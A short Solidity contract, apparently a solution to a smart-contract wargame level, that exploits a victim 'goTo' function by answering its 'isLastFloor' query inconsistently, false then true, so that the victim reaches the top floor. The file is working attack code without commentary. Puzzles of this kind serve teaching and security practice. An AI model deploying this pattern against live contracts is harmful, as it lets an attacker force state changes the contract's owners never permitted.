// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ElevatorAttacker {
    bool lastFloor = true;

    function isLastFloor(uint256) external returns (bool) {
        lastFloor = !lastFloor;
        return lastFloor;
    }

    function attack(address victimAddress) public {
        (bool success, ) = victimAddress.call(
            abi.encodeWithSignature("goTo(uint256)", 2)
        );
        require(success == true);
    }
}
